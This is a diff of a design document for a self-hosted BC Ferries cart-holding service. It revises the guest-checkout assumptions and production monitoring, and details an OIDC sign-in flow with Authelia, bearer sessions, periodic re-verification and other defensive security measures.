   blocked (R16).
@@ -883,7 +947,7 @@ hold it watches for `ERR_BLOCKED_BY_ADMINISTRATOR` or `ERR_NAME_NOT_RESOLVED` on
   hold, and the pod is destroyed after any viewed hold. **Owner cost:** today the owner's checkout signs in
   for saved payment cards (`site.py:270-271`) and possibly account-only fares; under this plan the owner
   also checks out as a guest.
-- **Guest checkout is assumed to work; there is no live-site spike** (owner, round 2: "No spike for now,
+- **Guest checkout is assumed to work; no spike tests it** (owner, round 2: "No spike for now,
   assume it works and if not we will adjust later, don't make any one way door decisions on this"). What
   the removed spikes (S1, S2, S2b, S5, S6, S7, the live part of S-FIX) would have told us comes instead from:
   - **fixtures captured from the owner's own real use during M1**, the same way the existing fixtures were
@@ -898,25 +962,39 @@ hold it watches for `ERR_BLOCKED_BY_ADMINISTRATOR` or `ERR_NAME_NOT_RESOLVED` on
     blocked host shows as `checkout_host_blocked` (§3.6 step 6) and by name in Hubble, and the owner adds it.
     S-3DS (M3) widens the list across issuers.
 - **Production detection** replaces the spikes:
-  - the agent reports any visit to BC Ferries' login page or an account-required page during a checkout
-    (`event{checkout_login_seen}`), and a cart the site has expired (`cart_expired_by_site`);
-  - "Did you book it?" answers carry an optional reason ("the site wanted me to sign in", "payment failed",
-    "checkout broke", "ran out of time", "changed my mind"), which also tells a forced login wall from a
-    voluntary sign-in;
-  - `ferrywatch_holds_total{outcome}`, `ferrywatch_checkout_login_seen_total`,
+  - the agent reports any visit to BC Ferries' login page or an account-required page during a checkout as
+    `event{checkout_login_seen, forced}`. `forced` is true when the site sent the checkout there: the page
+    was reached by an HTTP redirect from a cart, review or payment step, or shows an account-required
+    message. A visit the user started (clicking the site's own sign-in link) is `forced: false`. This is
+    best effort until a real login wall is captured in a fixture. It also reports a cart the site has
+    expired (`cart_expired_by_site`);
+  - "Did you book it?" answers carry an optional reason ("the site wanted me to sign in" = `needed_account`,
+    "I tried to sign in" = `tried_sign_in`, "payment failed", "checkout broke", "ran out of time", "changed
+    my mind"), so a forced login wall can be told from a voluntary sign-in;
+  - `ferrywatch_holds_total{outcome}`, `ferrywatch_checkout_login_seen_total{forced}`,
     `ferrywatch_releases_total{check}` and the two histograms (§9.5);
-  - an admin alert, `guest_checkout_failing`, when 2 or more viewed holds within 7 days end with a login
-    wall or a "wanted me to sign in" or "checkout broke" answer (§8.2).
+  - a small **hold-outcome record** per viewed or expired hold (day, outcome, answer reason, fare name,
+    vehicle type, login seen and forced, release check, checkout seconds; no booking reference), kept 400
+    days like audit and usage (§6.4), so the owner can see *which* fare or vehicle types failed before
+    choosing the per-type switch below;
+  - an admin alert, `guest_checkout_failing`, on the **first** forced login wall or `needed_account` answer
+    (at household volume one is enough to act on), and the PrometheusRule `GuestCheckoutFailing` when 2 or
+    more viewed holds within 7 days end with a forced login wall or a `needed_account` or `checkout_broke`
+    answer (§8.2). Voluntary visits (`forced: false`) and `tried_sign_in` answers are counted but alert
+    nobody.
 - **If guest checkout fails in production, the adjustment is immediate and reversible:** turn on "Pause
   carting" on the admin Fleet page at once (alert-only: no new holds), then set `autoCart: false` in values
   so it survives restarts. Bookable alerts link to `search_url` on bcferries.com (`site.py:72-87`). If only
   some fare or vehicle types need an account, list them in `alertOnlyFareTypes` / `alertOnlyVehicleTypes`
-  (values) instead. Then decide on an account mode. **No** pod-served password page and no pre-cart VNC
-  window under any fallback.
+  (values) instead. The owner's own logged-in checkout is still available from the legacy app, which is kept
+  restorable until a real guest checkout has worked on the new stack (§12.5). Then decide on an account
+  mode: with stored credentials excluded (decision 1 and "Never" below), the candidate is the attended
+  sign-in before a cart (§15), which needs the owner to reopen old Q1. **No** pod-served password page under
+  any fallback, and no pre-cart VNC window in v1 or as an automatic fallback.
 - **Two-way doors, stated explicitly** (nothing in the DB, the protocol or the pod shape assumes guest
   forever):
-  1. `SiteSession.login()` (`site.py:270-301`) and `Credentials` stay in the agent package, with their tests,
-     behind a disabled flag; they are not deleted (§5.2).
+  1. `SiteSession.login()` (`site.py:270-301`) and `Credentials` stay in the agent package behind a disabled
+     flag, with their tests still running in CI (§11.4); they are not deleted (§5.2).
   2. A per-trip `checkout_mode` is reserved in the data model (`trips.checkout_mode`, default `'guest'`, §6.4)
      and the protocol (`configure.checkout_mode`, §5.3), so an account mode is an added value, not a change
      in what existing rows or messages mean.
@@ -924,16 +1002,29 @@ hold it watches for `ERR_BLOCKED_BY_ADMINISTRATOR` or `ERR_NAME_NOT_RESOLVED` on
      type.
   4. The VAP's env allowlist can admit a future login-mode variable (`FW_CHECKOUT_MODE`) by a params change
      (`optionalEnv`, §7.5), without editing the policy.
-- **Can users sign in to BC Ferries inside the browser?** (Owner, round 2.) They may: during the VNC
-  checkout the user is on the real bcferries.com, and bcferries.com, including `/login`, is on the
-  allowlist. The password manager is off, so nothing is saved, and nothing persists after the pod exits. But
-  the plan does not rely on it: the owner has observed that BC Ferries' login page won't accept a login while
-  a guest cart exists (README.md "Things to know about BC Ferries"; `site.py:288-290`), so signing in may
-  drop the held cart. The cart screen (`/c/<trip>`) and the checkout landing page say so: "Check out as a
-  guest: signing in to BC Ferries during checkout can empty this cart."
-- **Pre-cart sign-in window: no** (owner, round 2: old Q1, "No"). VNC stays strictly gated to a held cart. An
-  attended sign-in before a cart (the former M5) is listed as a possible future option in §15; it stays
-  possible because of doors 1, 2 and 4 above.
+  5. The legacy deployment, its PVC and the owner's `BCF_USER`/`BCF_PASS` stay (scaled to zero) until a real
+     guest checkout has worked on the new stack, not for a fixed 14 days (§12.5).
+  6. The VNC ticket's `aud` names its purpose (§5.5) and C22 is scoped to *checkout* viewers, so a later
+     sign-in window is a new audience and a named branch, not a rewrite of the checkout gate.
+- **Can users sign in to BC Ferries inside the browser?** (Owner, round 2: "Users can always sign-in on the
+  browser?") **Probably not during checkout, and the plan advises against it.** Every VNC session has a held
+  guest cart, because VNC exists only while a cart is held, and the owner has observed that BC Ferries'
+  login page won't accept a login while a guest cart exists ([top-level README](../../README.md) "Things to
+  know about BC Ferries"; `site.py:288-290`, where the site clears the login form). The page is not blocked
+  (bcferries.com, including `/login`, is allowlisted, §5.6), so a user can try, but should expect the
+  sign-in to fail; whether trying affects the held cart is unverified. There is a security reason too: a
+  password typed there crosses the same plaintext path as card data (Cloudflare, cloudflared, Envoy and
+  vnc-edge, R4) into a Chromium running without its sandbox (R2), and any BC Ferries account session it
+  creates lives on at BC Ferries after the pod exits (the pod itself keeps nothing; the password manager is
+  off). So the cart screen (`/c/<trip>`), the checkout landing page, the cart banner and the invite email
+  say: "Check out as a guest. Don't sign in to BC Ferries here: it doesn't accept a sign-in while a cart is
+  held." Supporting sign-in properly is the attended sign-in option in §15, which comes with the sandbox
+  hardening first. If the owner prefers to make the advice a rule, one `URLBlocklist` entry blocks `/login`
+  (§5.6).
+- **Pre-cart sign-in window: not in v1** (owner, round 2: old Q1, "No"). VNC stays strictly gated to a held
+  cart. An attended sign-in before a cart (the former M5) is listed as a possible future option in §15. It
+  is not designed out (doors 1, 2, 4 and 6 above), but adding it is real work, listed there, and needs the
+  owner's explicit decision.
 - **Never:** a dashboard password form, an operator-written Secret, per-user credentials in 1Password or ESO,
   or a pod-served credential page. Each puts the plaintext through a component the operator controls
   [R:map-threat-model, R:billing-guest-mode-credentials Q4].
@@ -980,43 +1071,76 @@ The IdP stays replaceable: issuer, client id and secret, scopes and claim names 
 
 #### 6.2.2 Sign-in and the cookie-less session
 
-1. **Start.** When the SPA has no token, or the API rejects it, the SPA generates `state` and `nonce` (128
-   bits each) and a PKCE `code_verifier`, and keeps them with the path to return to in `sessionStorage`. It
-   reads the public sign-in settings from `GET /auth/config` (authorization endpoint, client id, scopes,
-   redirect URI; nothing secret) and sends the whole window to Authelia's authorization endpoint with
-   `response_type=code`, `response_mode=fragment`, `code_challenge` (S256), `state`, `nonce` and the scopes
-   `openid profile email groups`.
+1. **Start.** The SPA starts sign-in on its own only when the API answers 401 for an expired session or one
+   due for re-verification (so a cart alert still lands on `/c/<trip>`). With no token at all, or after an
+   explicit sign-out (a "signed out" flag in localStorage), it shows the signed-out screen with one "Sign
+   in" button instead (§10); otherwise "Sign out" would silently sign the same person straight back in,
+   because their Authelia session and consent are still alive. To sign in, the SPA generates `state` and
+   `nonce` (128 bits each) and a PKCE `code_verifier`, and keeps them with the path to return to in
+   `sessionStorage`. It reads the public sign-in settings from `GET /auth/config` (authorization endpoint,
+   client id, scopes, redirect URI; nothing secret) and sends the whole window to Authelia's authorization
+   endpoint with `response_type=code`, `response_mode=fragment`, `code_challenge` (S256), `state`, `nonce`
+   and the scopes `openid profile email groups`.
 2. **Authelia.** A person without an Authelia session signs in with password and second factor. The client's
    authorization policy denies anyone outside groups `ferry-watch` and `admin` (§6.2.3). The first time,
    Authelia asks for consent with a "remember" choice; after that it doesn't ask.
 3. **Callback.** Authelia redirects to `https://ferry.chestr.dev/auth/callback#code=…&state=…`. The
    fragment never reaches a server, so the code never appears in an access log (C15). The SPA route checks
    `state` against sessionStorage (a login-CSRF defence), clears the fragment with `history.replaceState`,
-   and POSTs `{code, code_verifier, state, nonce}` as JSON to `/auth/session`.
+   and POSTs `{code, code_verifier, state, nonce}` as JSON to `/auth/session` (with its current token in
+   `Authorization` when it is re-verifying).
 4. **Exchange and verify.** ferry-web exchanges the code at the token endpoint with its client secret
    (`client_secret_basic`, Authelia's default for confidential clients) and the verifier. It verifies the
-   `id_token`: the signature against the issuer's JWKS (cached; fetched again once when a `kid` is unknown),
-   `iss` equal to the configured issuer, `aud` containing the client id (and `azp` when present), `exp` and
-   `iat` within 60 s of skew, and `nonce` equal to the posted one. The access token is discarded; the app
-   calls no IdP API with it.
-5. **Map and admit.** `uid = hash(iss, sub)` (§6.2.6). An `identities` row for `(iss, sub)` belonging to an
-   active user signs that user in. Otherwise an open invitation matching the configured claim
-   (`preferred_username` for Authelia, §6.2.7) creates the user. Otherwise the answer is 403 "Your access is
-   being set up" and nothing is created. Suspended users get 403.
+   `id_token`: the header's `alg` must be in a configured allowlist (`[RS256]` by default; `none` and HMAC
+   algorithms are always refused, so a token "signed" with the client secret is never accepted), the
+   signature against the issuer's JWKS (cached; fetched again once when a `kid` is unknown), `iss` equal to
+   the configured issuer, `aud` containing the client id (and `azp` when present), `exp` and `iat` within
+   60 s of skew, and `nonce` equal to the posted one. The access token is discarded; the app calls no IdP
+   API with it. (v1 has exactly one provider. Before several are allowed, each flow is bound to its provider:
+   a per-provider redirect URI plus a provider id kept with `state`, posted, and checked against the
+   `id_token`'s `iss`, or the RFC 9207 `iss` response parameter where the IdP sends it; §6.2.6.)
+5. **Map and admit.** The uid is computed, never looked up: `h = hash(iss, sub)` and
+   `uid = identityAliases.get(h, h)`, from the verified `id_token` and the GitOps ConfigMap only (§6.2.6).
+   The `identities` row for `(iss, sub)` is a cache of that uid: if it holds a different one, the sign-in is
+   refused and the admin alerted (C23). Then: an active user with that uid is signed in; otherwise an open
+   invitation matching the configured claim (`preferred_username` for Authelia, §6.2.7), or a
+   `bootstrapAdmins` entry, creates the user with that uid; otherwise the answer is 403 "Your access is being
+   set up", no user is created, and the principal (iss, sub, `preferred_username`, `email`, first and last
+   seen) is recorded in `unmatched_identities` for 30 days, where the Users page shows it and the alias tool
+   can use it. Suspended users get 403. The `groups` claim is stored in `identities.last_groups`. A sign-in
+   whose `email` differs from the stored one is flagged on the Users page (R21).
 6. **Session.** ferry-web inserts a `sessions` row and returns an opaque 256-bit random token (base64url)
-   once; only its SHA-256 is stored. Idle expiry is 7 days and absolute expiry 30 days (§8.2). The SPA keeps
-   the token in `localStorage` on `ferry.chestr.dev` and sends `Authorization: Bearer <token>` on every API
-   call.
-7. **Dashboard WebSocket.** The upgrade passes the usual Origin check; the first message must be
-   `{type: "auth", token}` within 5 s. Until then the server sends nothing, and a missing or bad token closes
-   the socket with 4401. The token never goes in a URL (C15). At most 5 sockets per user, each living at most
-   60 min; revoking a user's sessions closes their sockets at once.
+   once; only its SHA-256 is stored. Idle expiry is 7 days and absolute expiry 30 days (§8.2), and the
+   session must be **re-verified with the IdP** at least every 24 h (below). The SPA keeps the token in
+   `localStorage` on `ferry.chestr.dev` and sends `Authorization: Bearer <token>` on every API call.
+7. **Dashboard WebSocket.** `/api/ws` is exempt from the header middleware, because a browser cannot attach
+   `Authorization` to an upgrade; first-message auth is mandatory instead. The upgrade passes the usual
+   Origin check; the first message must be `{type: "auth", token}` within 5 s. Until then the server sends
+   nothing, and a missing or bad token closes the socket with 4401. The token never goes in a URL (C15). The
+   socket accepts messages of at most 4 KiB (aiohttp's default is 4 MiB). Each socket records the
+   `token_hash` of the session it authenticated with, and is closed when that session is revoked or
+   expires for any reason (logout, "sign out everywhere", suspension, idle or absolute expiry, or
+   re-verification falling due); the hub re-checks this on every 15 s ping. At most 5 sockets per user,
+   each living at most 60 min.
 
-Every `/api/*` route requires a valid session of a user in state `active`: 401 for a missing, unknown,
-expired or revoked token, 403 for a user who is not active. `POST /auth/logout` revokes the current session;
-"Sign out everywhere" on the Account card and admin suspension revoke all of a user's sessions. Session rows
-record `iss`, `sub`, creation, last use (written at most every 5 min) and a coarse client label, so the
-Account card can list them.
+Every `/api/*` route except `/api/ws` requires a valid session of a user in state `active`: 401
+(`{reason: expired | reverify | revoked | missing}`) for a missing, unknown, expired, unverified or revoked
+token, 403 for a user who is not active. `POST /auth/logout` revokes the current session and closes its
+sockets; "Sign out everywhere" on the Account card and admin suspension revoke all of a user's sessions.
+Session rows record `iss`, `sub`, creation, last use (written at most every 5 min), last IdP verification and
+a coarse client label, so the Account card can list them.
+
+**Re-verification with the IdP (every 24 h).** Authelia applies the client's authorization policy, and
+refreshes the user from LDAP, only when the browser comes back to its authorization endpoint (§2.2). So each
+session carries `verified_at`, and 24 h after it (`identity.reverifyHours`, 1-24) the API answers 401
+`reverify`. The SPA then repeats steps 1-5, sending its current token with the exchange. While the person's
+Authelia session lives and they are still allowed, this is a silent redirect (consent is remembered). A
+successful exchange for the same uid rotates the token (the old one is revoked), re-reads `groups` and
+re-applies `autoApproveGroups`. If Authelia refuses (`access_denied`: no longer in the groups; or the person
+was deleted from lldap, which ends their Authelia session at its next LDAP refresh), no new token is issued and the
+old one stays unusable until it is purged. Consequences: removal at the IdP reaches the app within 24 h
+(R20), a stolen token stops working within 24 h even if nobody notices (R17), and a person without "Remember
+me" who was idle for more than 3 days signs in to Authelia again.
 
 **CSRF.** The token travels in a header that browsers never attach on their own, so classic CSRF no longer
 applies. The existing Origin and JSON checks on mutations (`server.py:220-229`) stay anyway.
@@ -1040,14 +1164,18 @@ spec:
   rules:
   - filters:
     - type: RequestHeaderModifier
-      requestHeaderModifier: {remove: [Cookie]}                # every Cookie header; Authorization is kept
+      requestHeaderModifier:
+        remove: [Cookie, Remote-User, Remote-Groups, Remote-Email, Remote-Name]   # every Cookie header, and the
+                                                               # dev header adapter's names; Authorization is kept
     backendRefs: [{name: ferry-web, port: 8765}]
 ```
 
 There is no SecurityPolicy on this route. Browsers still send `authelia-home-ops` (domain `chestr.dev`) to
 `ferry.chestr.dev`; the route drops it with every other cookie, so ferry-web never sees it (C16).
-`Authorization` is kept because it carries only the app's own bearer token. ferry-web sets no cookie, and a
-CI test asserts it never sends `Set-Cookie`. gatus may probe the route; it gets the static shell.
+`Authorization` is kept because it carries only the app's own bearer token. The `Remote-*` names are removed
+too, although production trusts no identity header: if the dev header adapter were ever switched on by
+mistake, a client could not supply them through this route. ferry-web sets no cookie, and a CI test asserts it
+never sends `Set-Cookie`. gatus may probe the route; it gets the static shell.
 
 home-cluster adds, following its own conventions:
 - In `default/authelia/app/resources/configuration.yaml`, under `identity_providers.oidc`:
@@ -1099,26 +1227,42 @@ discourages it, and one screen per person per year costs little. Refresh tokens 
 
 #### 6.2.4 Re-authentication, sign-out and the iOS home-screen app
 
-- **When the app session lapses** (7 days idle, 30 days absolute, or revoked), the API answers 401 and the
-  SPA starts step 1 again, remembering the current path (for example `/c/<trip>` from a cart alert). While
-  the person's Authelia session is alive (3 days idle and 7 days total, or 6 months with "Remember me";
-  `configuration.yaml:32-36`) and their consent is remembered, Authelia sends the browser straight back
-  without showing anything, so re-auth is a quick redirect. Authelia 4.39 also supports `prompt=none`
-  (verified upstream: it answers `login_required` or `consent_required` instead of showing a page). The SPA
-  does not need it, because the plain redirect is already silent when nothing has to be asked, but it is
-  there for any check that must never show a page.
-- **Sign-out** revokes the app session. Signing out of Authelia too is a link to Authelia's own logout page;
-  RP-initiated logout is not relied on.
+- **When the app session lapses or is due for re-verification** (7 days idle, 30 days absolute, 24 h since
+  the last IdP verification, §6.2.2), the API answers 401 and the SPA starts step 1 again, remembering the
+  current path (for example `/c/<trip>` from a cart alert). While the person's Authelia session is alive (3
+  days idle and 7 days total, or 6 months with "Remember me"; `configuration.yaml:32-36`), they are still in
+  the client's groups, and their consent is remembered, Authelia sends the browser straight back without
+  showing anything, so re-auth is a quick redirect. Authelia 4.39 also supports `prompt=none` (verified
+  upstream: it answers `login_required` or `consent_required` instead of showing a page). The SPA does not
+  need it, because the plain redirect is already silent when nothing has to be asked, but it is there for
+  any check that must never show a page.
+- **A revoked session** (logout elsewhere, "sign out everywhere", suspension) also answers 401; the SPA
+  starts sign-in only for `expired` and `reverify`, and shows the signed-out screen for `revoked`.
+- **Sign-out** revokes the app session, closes its sockets and sets the SPA's "signed out" flag, so the
+  next visit shows the signed-out screen rather than a silent sign-in. Signing out of Authelia too is a link
+  to Authelia's own logout page; RP-initiated logout is not relied on.
 - **The iOS home-screen app** (R18). A web app opened from the Home Screen keeps its own storage, separate
   from Safari. If iOS opens the redirect to Authelia, or the way back, outside the app, the callback cannot
-  find the app's `state` and verifier and sign-in fails there. Whether iOS 16.4+ keeps these navigations
-  inside the app is unverified; S-IOS checks it on the owner's iPhone during M1. **Fallback, built only if
-  S-IOS fails: a handoff code.** The home-screen app starts sign-in through `POST /auth/start`, which keeps
-  the verifier and nonce server-side under `state` and returns a random app secret. If the callback lands in
-  Safari, ferry-web completes the exchange there and shows a one-time 8-character code (valid 2 minutes,
-  single use, bound to that `state`). The person types it into the home-screen app, which redeems it with its
-  app secret (`POST /auth/redeem`) for its own session token. A sign-in link started by someone else yields
-  nothing unless the victim reads them the code shown after their own sign-in.
+  find the app's `state` and verifier and sign-in fails there. A first sign-in also leaves the app partway
+  through: to Mail for Authelia's emailed enrolment code, then to an authenticator app or a passkey prompt.
+  If iOS evicts the backgrounded app, it relaunches at the manifest's `start_url` (`/`,
+  `web/public/manifest.webmanifest`), the in-flight Authelia page is gone, and a sessionStorage-only
+  `state` and verifier may be gone too. Whether iOS 16.4+ keeps these navigations inside the app, and how
+  long it keeps a backgrounded app alive, is unverified; S-IOS checks both on the owner's iPhone during M1.
+  Fallbacks, built only for what S-IOS shows fails:
+  - **Lost `state` on return:** keep the pending sign-in (`state`, nonce, verifier, return path) in
+    localStorage too, keyed by `state` and expiring after 10 minutes, and accept it at the callback when
+    sessionStorage is empty.
+  - **Lost Authelia page on relaunch:** the person taps "Sign in" again; for the first sign-in (with
+    enrolment), the invite email suggests doing it in Safari or on a computer, after which the home-screen
+    app needs only the password.
+  - **Callback outside the app: a handoff code.** The home-screen app starts sign-in through
+    `POST /auth/start`, which keeps the verifier and nonce server-side under `state` and returns a random
+    app secret. If the callback lands in Safari, ferry-web completes the exchange there and shows a one-time
+    8-character code (valid 2 minutes, single use, bound to that `state`). The person types it into the
+    home-screen app, which redeems it with its app secret (`POST /auth/redeem`) for its own session token. A
+    sign-in link started by someone else yields nothing unless the victim reads them the code shown after
+    their own sign-in.
 
 #### 6.2.5 Alternatives considered
 
@@ -1131,8 +1275,9 @@ discourages it, and one screen per person per year costs little. Refresh tokens 
 | The owner's Authelia cookie at the backend | Dropped with every Cookie header; the app has none | Dropped after ext-auth | EG's own OIDC session cookies live on the ferry host; the route can still drop Cookie after the filter, but the session is EG's |
 | App code | OIDC client, sessions, bearer plumbing (about 4-5 days) | Header adapter (about 1 day) | Header adapter, plus EG OIDC and JWT config |
 | Gateway and Authelia changes | One RequestHeaderModifier; one OIDC client | Route SecurityPolicy, ReferenceGrant entry, `access_control` rule | Route SecurityPolicy holding the client secret in `ferry-watch` |
-| Session length | The app's own (7 d idle, 30 d), renewed silently while Authelia's session lives | Authelia's | EG's cookie lifetime |
-| New residuals | Token in localStorage (R17), iOS redirect context (R18), unauthenticated requests reach the app (R19) | Fail-open on detachment (former R15) | Fail-open on detachment |
+| Session length | The app's own (7 d idle, 30 d), re-verified with Authelia every 24 h, silently while Authelia's session lives | Authelia's | EG's cookie lifetime |
+| Removal at the IdP (lldap group, deleted user) | Reaches the app at the next re-verification, within 24 h (R20); suspend in the app for immediate effect | Within about a minute (every request re-checked; LDAP refresh 1 m) | At EG's next token refresh |
+| New residuals | Token in localStorage (R17), iOS redirect context (R18), unauthenticated requests reach the app (R19), IdP removal delayed up to 24 h (R20) | Fail-open on detachment (former R15) | Fail-open on detachment |
 
 Why A: the owner asked for OIDC; it fails closed; it is testable without the gateway; and the cookie-less
 session removes the only thing that made it costly on `chestr.dev`, the choice between gateway-wide Lua and a
@@ -1160,14 +1305,22 @@ class Sessions(Protocol):                  # the app's own bearer sessions, inde
   with issuer, client id, a secret reference, scopes, the claim names for username, email, name and groups,
   and the invite-match claim. The `provider` part of the uid is the issuer URL.
 - `TrustedHeaderProvider`: kept only as a LAN or dev adapter (docker compose, or a LAN-only route on
-  envoy-internal behind its gateway-wide ext-auth). Off in production; the chart fails to render if it is
-  enabled together with the envoy-external route (helm-unittest).
-- **Stable id:** `uid = "u" + base32lower(sha256("fw/v1|" + iss + "|" + sub))[:19]` (20 characters,
-  DNS-label safe). It is deterministic, so no DB row can map a principal onto another user's browsers (C23).
-  Authelia's `sub` is an opaque per-user UUID, so a uid exists only after the person's first sign-in;
-  invitations bind then (§6.2.7).
+  envoy-internal behind its gateway-wide ext-auth). Its principal is `iss` = the configured
+  `identity.trustedHeaders.issuer` (for example `header:authelia-lan`) and `sub` = `Remote-User` (the lldap
+  username). That is not Authelia's OIDC `sub` (an opaque UUID), so switching a deployment between the two
+  needs one alias per user. Off in production; the chart fails to render it enabled together with the
+  external dashboard route (`routes.dashboard.enabled`, helm-unittest). The checkout route has its own flag
+  (`routes.checkout.enabled`), so a LAN deployment can use the adapter and still have checkout.
+- **Stable id:** `h = "u" + base32lower(sha256("fw/v1|" + iss + "|" + sub))[:19]` (20 characters,
+  DNS-label safe), and `uid = identityAliases.get(h, h)`, computed at every sign-in from the verified
+  `id_token` and the ConfigMap only. It is deterministic, so no DB row can map a principal onto another
+  user's browsers: `identities.uid` is a cache that must equal it (a mismatch refuses the sign-in, C23).
+  Authelia's `sub` is an opaque UUID per *username* (`internal/oidc/store.go:76-101`), so a uid exists only
+  after the person's first sign-in (invitations bind then, §6.2.7), and a reused username would inherit it
+  (R21).
 - `identityAliases` (`new principal hash → existing uid`) in the GitOps ConfigMap carry users across an IdP
-  change.
+  change. Aliases take precedence over `identities` rows and over `bootstrapAdmins`, so pointing
+  `bootstrapAdmins` at a new issuer first cannot give the owner a fresh uid with no trips.
 - Email and username are for display, invitations and alias proposals, never a key.
 
 **Replacing the IdP later** (runbook):
@@ -1177,11 +1330,14 @@ class Sessions(Protocol):                  # the app's own bearer sessions, inde
 2. **Providers without plain OIDC, or several at once** (GitHub has no OIDC `id_token` for users; Apple
    relays email addresses; "Google or GitHub"): put a broker in front (Dex, Pocket ID or authentik, for
    example) and make it ferry-web's one issuer, or configure several `OidcProvider` entries and show one
-   button per provider.
+   button per provider. Several entries need each flow bound to its provider first (a per-provider redirect
+   URI and a provider id posted with the code and checked against the `id_token`'s `iss`, §6.2.2 step 4),
+   so a code from one issuer can't be exchanged as another's.
 3. **Moving existing users:** each person signs in once through the new issuer and lands as an unmatched
-   identity ("Your access is being set up"). The admin CLI proposes aliases by matching email or username
-   against existing users and writes them as a GitOps PR; once merged, that identity maps to the old uid.
-   Running pods keep working, because `FW_OWNER` is the old uid.
+   identity ("Your access is being set up"), recorded in `unmatched_identities` (§6.2.2 step 5). The admin
+   proposes aliases from that list by matching email or username against existing users (by hand from the
+   Users page in v1; the CLI is M4) and writes them as a GitOps PR; once merged, that identity maps to the
+   old uid. Running pods keep working, because `FW_OWNER` is the old uid.
 4. **Admission:** social IdPs have no `ferry-watch` group, so the app's own invitation list is the gate
    (matched on a verified email, or on one-time invite codes where emails differ).
 5. **Cookies:** none of this puts a cookie on the ferry host, so R12 stays closed.
@@ -1193,14 +1349,19 @@ Nothing in the browser pods, the VNC gate, the VAPs or the operator changes, bec
 - v1 admission has three gates: Authelia issues codes for the `ferry-watch` client only to groups
   `ferry-watch` and `admin` (the client's authorization policy, default deny); the app admits only people the
   admin invited on the Users page; suspension revokes every session and closes the user's sockets at once.
+  The first gate is evaluated when Authelia issues a code, so at sign-in and at each 24-hourly
+  re-verification, not on every request (R20); to remove someone at once, suspend them in the app first
+  (§12.5).
 - "Add person" (lldap username, email, optional limit overrides, mandatory reason) creates an `invites` row
   and sends the `invited` email (§12.5). The first sign-in from the configured issuer whose
   `preferred_username` matches an open invitation creates the user with `uid = hash(iss, sub)`, applies the
   overrides and closes the invitation. The match claim is config: `preferred_username` for Authelia (lldap
-  usernames are admin-made and unique), or `email` for a provider that really verifies it (Authelia 4.39 only
-  asserts `email_verified`). Invitations expire after 30 days.
+  usernames are admin-made and unique at any moment, and must never be reused, R21), or `email` for a
+  provider that really verifies it (Authelia 4.39 only asserts `email_verified`). Invitations expire after
+  30 days.
 - Optional `autoApproveGroups` (default empty) lets membership of a listed group stand in for "Add person"
-  while the IdP is lldap. Groups are a generic OIDC claim, load-bearing only if the owner turns this on.
+  while the IdP is lldap. Groups are a generic OIDC claim, load-bearing only if the owner turns this on, and
+  read at sign-in and re-verification only.
 - The draft's "request access" queue stays deferred: nobody outside the client's groups can get a code for
   this client. It returns with a social IdP.
 
@@ -1208,8 +1369,9 @@ Nothing in the browser pods, the VNC gate, the VAPs or the operator changes, bec
 
 `bootstrapAdmins` in GitOps names the owner by issuer and username (for example
 `{issuer: https://auth.chestr.dev, username: <owner>}`). It acts as a standing invitation: the first matching
-sign-in binds it to that uid, which the UI cannot demote. `users.is_admin` is the DB flag for other admins.
-The `groups` claim never grants admin by itself. **Admins never get VNC** into tenant browsers.
+sign-in binds it to that uid (after `identityAliases` are applied, §6.2.6), which the UI cannot demote.
+`users.is_admin` is the DB flag for other admins. The `groups` claim never grants admin by itself. **Admins
+never get VNC** into tenant browsers.
 
 #### 6.2.9 Hard gates before anyone new joins lldap
 
@@ -1217,6 +1379,7 @@ The `groups` claim never grants admin by itself. **Admins never get VNC** into t
   Paperless to their own groups, using the same mechanism as the `ferry-watch` client; today every client
   accepts any lldap user at `two_factor` (`configuration.yaml:131-214`).
 - Never give the app lldap admin credentials.
+- Never reuse an lldap username (R21).
 
 ### 6.3 API changes (`server.py`)
 
@@ -1226,13 +1389,17 @@ The `groups` claim never grants admin by itself. **Admins never get VNC** into t
   `[security_headers, cache, error, identity, cross_site]` (today `server.py:449-451`; aiohttp runs the list
   outermost first, and `error_middleware` at `server.py:201-217` formats `ApiError`). `/livez` and `/readyz`
   replace `/healthz` (`server.py:426-433`), are exempt from identity, and return nothing tenant-specific.
-  Static files and `/auth/*` are exempt too; everything under `/api/` requires a session.
+  Static files and `/auth/*` are exempt too; everything under `/api/` requires a session, except `/api/ws`,
+  which a browser cannot send a header on and which must authenticate with its first message instead
+  (§6.2.2 step 7).
 - `Services` (`server.py:60-95`) becomes a **repository scoped by user**. Every lookup takes
   `(uid, trip_id)`, and a foreign trip returns the same 404 as a missing one. Filtering happens in SQL, not in
   `views.py`, so a new snapshot field cannot leak across tenants.
 - The Hub (`server.py:134-184`) becomes **per user**: each client authenticates with its first message
-  within 5 s (§6.2.2) and records its uid; unauthenticated sockets are capped in number; `trip_changed` marks
-  only that user dirty; one payload is built per dirty user, coalesced over 100 ms; at
+  within 5 s (§6.2.2) and records its uid and its session's `token_hash`, and is closed when that session is
+  revoked or expires (checked on every ping); unauthenticated sockets are capped per client
+  (`CF-Connecting-IP`) and in total; incoming messages are capped at 4 KiB; `trip_changed` marks only that
+  user dirty; one payload is built per dirty user, coalesced over 100 ms; at
   most 5 sockets per user, each living at most 60 min. The newest-only sender, the 15 s ping and the 10 s send
   timeout are kept.
 
@@ -1241,8 +1408,8 @@ The `groups` claim never grants admin by itself. **Admins never get VNC** into t
 | Route | Change |
 |---|---|
 | `GET /auth/config` | **New.** Public sign-in settings: authorization endpoint, client id, scopes, redirect URI. Nothing secret. |
-| `POST /auth/session` | **New.** `{code, code_verifier, state, nonce}` → `{token, idle_expires_at, expires_at}` (§6.2.2). Body ≤ 4 KiB, globally rate-limited. |
-| `POST /auth/logout` | **New.** Revokes the current session. |
+| `POST /auth/session` | **New.** `{code, code_verifier, state, nonce}` → `{token, idle_expires_at, expires_at, reverify_at}` (§6.2.2). With a current token in `Authorization`, a successful exchange for the same uid rotates it (re-verification). Body ≤ 4 KiB; rate-limited per client (`CF-Connecting-IP`) with a global ceiling as backstop. |
+| `POST /auth/logout` | **New.** Revokes the current session and closes its sockets. |
 | `POST /auth/start`, `POST /auth/redeem` | **Only if S-IOS fails:** the handoff-code fallback (§6.2.4). |
 | `GET /api/me/sessions`, `DELETE /api/me/sessions` | **New.** List my sessions; "sign out everywhere". |
 | `GET /api/state` | Per-user snapshot: `me`, `limits` (effective value plus source), `usage`, `trips[].browser{phase, reason, queue_position, starts_on, effective_interval, next_due, heartbeat_at, cart, viewer, lockdown_ok}`, `capacity{can_add, reason}`, `links{kofi}`, events. Drops the global `checkout_url`, `login_configured`, `alerts_configured` and `max_trips` (`views.py:118-143`). |
